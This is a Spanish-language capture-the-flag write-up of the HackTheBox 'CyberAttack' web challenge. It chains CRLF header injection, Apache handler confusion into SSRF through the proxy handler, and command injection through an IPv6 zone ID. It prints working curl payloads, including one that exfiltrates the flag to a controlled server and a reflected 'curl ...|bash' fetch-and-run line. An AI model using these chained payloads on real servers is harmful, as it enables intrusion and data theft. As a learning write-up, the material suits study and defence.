+++
title = "HTB Cyber Apocalypse 2025 | CyberAttack WriteUp"
date = "2025-05-15T13:21:10-06:00"
author = "vir"
authors = ["vir"]
tags = ["Writeup", "Web hacking"]
showFullContent = false
hideComments = true 
+++

## Introducción

Recientemente se llevó a cabo el CTF anual de HackTheBox "Cyber Apocalypse". Uno de los retos que más me gustó dentro de la categoría Web fue "Cyber Attack". Como todos los retos de este CTF, este está ambientado en el mundo fantástico de Eldoria. Se nos presenta una aplicación web destinada a atacar a los enemigos de Malakar.

A grandes rasgos, el reto requería explotar una inyección CRLF, una vulnerabilidad de tipo SSRF y una inyección de comandos. Adicionalmente para lograr resolverlo, fue necesario comprender algo llamado "ambigüedad semántica" en servidores Apache y aplicar un pequeño truco en IPv6 para conseguir inyectar comandos. Para resolver el reto, se nos provee el código fuente de la aplicación y archivos de configuración del servidor web.

## Desarrollo

La aplicación muestra un formulario permite introducir el nombre del usuario y el nombre de dominio o dirección IP a atacar. El siguiente ejemplo muestra el funcionamiento de la aplicación al usarla para atacar un nombre de dominio.

{{< image src="/img/htb_cyber_apocalypse_2025_cyberattack/img1.png" alt="img1" position="center" >}}

Al enviar el formulario, regresa un mensaje indicando que el ataque fue exitoso. Dicho mensaje se obtiene del parámetro `result` en la URL.

{{< image src="/img/htb_cyber_apocalypse_2025_cyberattack/img2.png" alt="img1" position="center" >}}

El siguiente ejemplo muestra el uso de la funcionalidad de atacar una dirección IP.

{{< image src="/img/htb_cyber_apocalypse_2025_cyberattack/img3.png" alt="img1" position="center" >}}

Sin embargo, en este caso recibimos un error _Forbidden_, pues no tenemos permitido interactuar con el recurso `/cgi-bin/attack-ip`.

{{< image src="/img/htb_cyber_apocalypse_2025_cyberattack/img4.png" alt="img1" position="center" >}}

Esto se entiende al ver el archivo de configuración `apache2.conf`, pues permite la interacción con dicho script únicamente si la petición HTTP se origina en el propio servidor:

```
ServerName CyberAttack

AddType application/x-httpd-php .php

<Location "/cgi-bin/attack-ip">
Order deny,allow
Deny from all
Allow from 127.0.0.1
Allow from ::1
</Location>
```

A continuación, se muestra el código fuente de ambos scripts y algunas conclusiones a las que llegué después de analizarlo.

```
#!/usr/bin/env python3

import cgi
import os
import re

def is_domain(target):
return re.match(r'^(?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.[a-zA-Z]{2,63}$', target)

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')
if not name or not target:
print('Location: ../?error=Hey, you need to provide a name and a target!')

elif is_domain(target):
count = 1 # Increase this for an actual attack
os.popen(f'ping -c {count} {target}')
print(f'Location: ../?result=Succesfully attacked {target}!')
else:
print(f'Location: ../?error=Hey {name}, watch it!')

print('Content-Type: text/html')
print()
```

- Se utiliza el comando `ping` para atacar el servicio que se le indica.
- Parece haber una inyección de comandos, pues el parámetro `target` se usa en la función `os.popen()`. Sin embargo, el mismo parámetro primero se verifica con una expresión regular y, si no tiene el formato de un nombre de dominio, no se ejecuta la función.
- En caso de no pasar la verificación, la respuesta HTTP será una redirección a través del encabezado `Location`, en donde se envía un mensaje de error concatenando el nombre del usuario. Al hacer esta concatenación en un encabezado, podría ser vulnerable a una inyección _CRLF_.
- Una interacción con este recurso se muestra a continuación, forzando un error al enviar un nombre de dominio inválido.

```
$ curl 'http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&name=v'
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="../?error=Hey v, watch it!">here</a>.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at 83.136.249.227 Port 46378</address>
</body></html>
```

**attack-ip:**

```
#!/usr/bin/env python3

import cgi
import os
from ipaddress import ip_address

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')

if not name or not target:
print('Location: ../?error=Hey, you need to provide a name and a target!')
try:
count = 1 # Increase this for an actual attack
os.popen(f'ping -c {count} {ip_address(target)}')
print(f'Location: ../?result=Succesfully attacked {target}!')
except:
print(f'Location: ../?error=Hey {name}, watch it!')

print('Content-Type: text/html')
print()

```

- El funcionamiento es muy similar al caso anterior, pero con pequeñas variaciones.
- Se utiliza nuevamente el comando `ping` para atacar la dirección IP indicada.
- En este caso, también parece haber una inyección de comandos, pues el parámetro `target` se usa en la función `os.popen()`, pero en este caso hay una validación con la función `ip_address()`. Esta función genera una excepción si la cadena recibida no tiene el formato de una dirección IPv4 o IPv6 válida.
- En caso de generarse la excepción, no realiza el ataque y envía una redirección con un mensaje de error en el encabezado `Location`.

Llegados a este punto, tenía claro que el único recurso con el que podría interactuar directamente era `/cgi-bin/attack-domain` y que debía lograr interactuar con `/cgi-bin/attack-ip` (ya que su acceso estaba limitado). Aunque buscaba alguna manera de forzar un _SSRF_, al inicio únicamente era capaz de inyectar encabezados HTTP en la respuesta. Esto lo muestro a continuación, logrando que la respuesta incluyera el nuevo encabezado `New-Header: HFC` inyectando los caracteres de retorno de carro y salto de línea `(%0d%0a)`.

```
$ curl -i 'http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&name=v%0d%0aNew-Header:HFC%0d%0a%0d%0a'
HTTP/1.1 302 Found
Date: Wed, 26 Mar 2025 03:14:46 GMT
Server: Apache/2.4.54 (Debian)
New-Header: HFC
Location: ../?error=Hey v
Content-Length: 282
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="../?error=Hey v">here</a>.</p>
<hr>
<--REDACTED-->
```

Después de un buen rato de buscar algún recurso que pudiera servirme, llegué a este [sitio](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/). Aquí se detalla el término de "ambigüedad semántica" en servidores Apache. A grandes rasgos, explica que Apache funciona mediante una gran cantidad de módulos. Estos módulos no necesariamente tienen una forma estandarizada de interpretar los campos que van a procesar, provocando ambigüedades en cómo lo manipulan.

El sitio detalla 3 tipos diferentes de ataques desarrollados a partir de dicha ambigüedad, pero para este reto utilicé únicamente el llamado _Handler Confusion_, donde se busca invocar algún _handler_ de Apache de forma arbitraria. Para comprender correctamente el origen e implicaciones del problema, se recomienda leer el artículo original. A continuación, únicamente agregaré una explicación muy resumida de esto, esperando que sea suficiente para comprender la solución al reto.

El autor explica que al utilizar el módulo `mod_php`, hay dos directivas que se parecen mucho en funcionalidad, pero que representan campos diferentes dentro de la estructura de httpd:

**Directivas:**

```
AddHandler application/x-httpd-php .php
AddType    application/x-httpd-php .php
```

**Sintaxis:**

```
AddHandler handler-name extensión [extensión] ...
AddType media-type extensión [extensión] ...
```

Aunque tienen una funcionalidad muy similar, realmente `handler-name` corresponde a la estructura `r->handler` y `media-type` corresponde a `r->content_type` dentro de httpd. Algo curioso (y por lo que se parecen tanto) es que tras bambalinas, `media-type` se termina convirtiendo en `handler-name`. El autor indica que, en teoría, si se logra controlar el encabezado `Content-Type` en la respuesta del servidor, es posible invocar cualquier handler de Apache de forma arbitraria.

Sin embargo, el flujo en el que se manejan las peticiones provoca que la conversión de estructuras no se efectúe, a menos que sea el propio servidor quien inicie una nueva petición internamente. Afortunadamente para nosotros, hay escenarios en los que el servidor hace nuevas peticiones internas, uno de ellos es cuando usa el módulo `mod_cgi`. Si el encabezado HTTP `Location` inicia con el caracter '/', Apache va a tratar este escenario como una redirección del lado del servidor para poder interactuar con el script CGI.

Se puede concluir que para poder invocar cualquier handler de Apache, se necesitan cumplir los siguientes requisitos:

- Módulo `mod_php` habilitado: Se confirma que se cumple, porque el archivo principal de la aplicación es index.php.

- Módulo `mod_cgi` habilitado: Se confirma que se cumple, pues la aplicación lo requiere para poder usar los scripts en Python `attack-domain` y `attack-ip`.

- Control sobre encabezados `Location` y `Content-Type` en la respuesta del servidor: Se confirma que se cumple, pues en este punto ya fue posible explotar la inyección _CRLF_ para crear encabezados nuevos.

Con todo en su lugar, llegó el momento de usar un handler distinto. Específicamente, se usó `server-status`, con el único fin de demostrar la viabilidad de la técnica. Como se muestra a continuación, el ataque fue exitoso y fue posible acceder a información del estado del servidor, como consumo de CPU, tráfico total, etc.

```
$ curl -i 'http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&name=v%0d%0aLocation:/hfc%0d%0aContent-Type:server-status%0d%0a%0d%0a'
HTTP/1.1 200 OK
Date: Wed, 26 Mar 2025 03:16:46 GMT
Server: Apache/2.4.54 (Debian)
Vary: Accept-Encoding
Content-Length: 4536
Content-Type: text/html; charset=ISO-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html><head>
<title>Apache Status</title>
</head><body>
<h1>Apache Server Status for 83.136.249.227 (via 192.168.63.136)</h1>

<dl><dt>Server Version: Apache/2.4.54 (Debian) PHP/7.4.33</dt>
<dt>Server MPM: prefork</dt>
<dt>Server Built: 2022-06-09T04:26:43
</dt></dl><hr /><dl>
<dt>Current Time: Wednesday, 26-Mar-2025 03:16:47 UTC</dt>
<dt>Restart Time: Wednesday, 26-Mar-2025 03:04:40 UTC</dt>
<dt>Parent Server Config. Generation: 1</dt>
<dt>Parent Server MPM Generation: 0</dt>
<dt>Server uptime:  12 minutes 6 seconds</dt>
<dt>Server load: 0.15 0.23 0.20</dt>
<dt>Total accesses: 7 - Total Traffic: 4 kB - Total Duration: 503</dt>
<dt>CPU Usage: u.03 s.03 cu.02 cs.01 - .0124% CPU load</dt>
<dt>.00964 requests/sec - 5 B/second - 585 B/request - 71.8571 ms/request</dt>
<dt>1 requests currently being processed, 5 idle workers</dt>
<--REDACTED-->
```

Una vez confirmado, usé el handler `proxy` para forzar un _SSRF_ completo, es decir, teniendo control sobre el destino, recurso, parámetros y encabezados de la petición. De esta manera, finalmente fue posible interactuar con `attack-ip` (pues la petición se origina desde el propio servidor).

```
$ curl -i 'http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=127.0.0.1%26name=v%0d%0a%0d%0a'
HTTP/1.1 302 Found
Date: Wed, 26 Mar 2025 03:19:21 GMT
Server: Apache/2.4.54 (Debian)
Location: ../?result=Succesfully attacked 127.0.0.1!
Content-Length: 301
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="../?result=Succesfully attacked 127.0.0.1!">here</a>.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>
```

La parte final del reto consistía en explotar una vulnerabilidad dentro de `attack-ip` con el fin de inyectar comandos. Recordemos que el parámetro `target` es validado con la función `ip_address()`, la cual genera una excepción si la cadena no tiene un formato de dirección IPv4 o IPv6. A continuación, muestro un par de ejemplos de esta funcionalidad:

**Dirección IPv4 válida:**

```
from ipaddress import ip_address
print(ip_address('127.0.0.1'))
```

**Resultado:**

```
127.0.0.1
```

**Dirección IPv4 inválida:**

```
from ipaddress import ip_address
print(ip_address('127.0.TEST.1'))
```

**Resultado:**

```
ERROR!
Traceback (most recent call last):
  File "<main.py>", line 2, in <module>
  File "/usr/local/lib/python3.12/ipaddress.py", line 54, in ip_address
    raise ValueError(f'{address!r} does not appear to be an IPv4 or IPv6 address')
ValueError: '127.0.TEST.1' does not appear to be an IPv4 or IPv6 address
```

Después de leer la [documentación de la biblioteca ipaddress](https://docs.python.org/3/library/ipaddress.html) y el [RFC 4007](https://docs.python.org/3/library/ipaddress.html), aprendí que en IPv6 es posible indicar un identificador de zona, usando la sintaxis `<ipv6>%<id_zona>`. Lo interesante es la única validación que hace la función `ip_address()` sobre esta característica: si el caracter '%' está presente, el ID de zona tambien tiene que incluirse, sin verificar qué tipo de caracteres lo componen.

Teniendo esto en mente, probemos nuevamente la función.

**Dirección IPv6 con inyección de comandos en ID de zona**

```
from ipaddress import ip_address
print(ip_address('::1%$(whoami)'))
```

**Resultado:**

```
::1%$(whoami)
```

La idea detrás del _payload_ final es codificar en base64 la bandera y usar `curl` para crear una petición HTTP, agregando la bandera codificada como parámetro en la URL y enviándola a un servidor bajo nuestro control.

```
$ curl -i 'http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%2bhttps://<--REDACTED-->?flag=`cat%2b/flag*|base64`)%26name=v%0d%0a%0d%0a'
HTTP/1.1 302 Found
Date: Wed, 26 Mar 2025 03:42:19 GMT
Server: Apache/2.4.54 (Debian)
Location: ../?result=Succesfully attacked ::1%$(curl hackersfight.club:8000|bash)!
Content-Length: 331
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="../?result=Succesfully attacked ::1%$(curl https://<--REDACTED-->?flag=`cat /flag*|base64`)!">here</a>.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>
```

Finalmente, recibiendo la petición desde el servidor vulnerable y consiguiendo la bandera.

```
$ grep flag access.log
83.136.249.227 - - [26/Mar/2025:03:42:19 +0000] "GET /?flag=SFRCe2g0bmRsMW42X200bDRrNHI1X2YwcmMzNX0= HTTP/1.1" 200 4252 "-" "curl/7.74.0"

$ echo 'SFRCe2g0bmRsMW42X200bDRrNHI1X2YwcmMzNX0='|base64 -d
HTB{h4ndl1n6_m4l4k4r5_f0rc35}
```

## Referencias útiles

- [Orange Tsai | Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [Python docs | ipaddress — IPv4/IPv6 manipulation library](https://docs.python.org/3/library/ipaddress.html)
- [RFC 4007 | IPv6 Scoped Address Architecture](https://datatracker.ietf.org/doc/html/rfc4007.html)
- [PortSwigger | Server-Side Request Forgery](https://portswigger.net/web-security/ssrf)
- [PortSwigger | OS Command Injection](https://portswigger.net/web-security/os-command-injection)
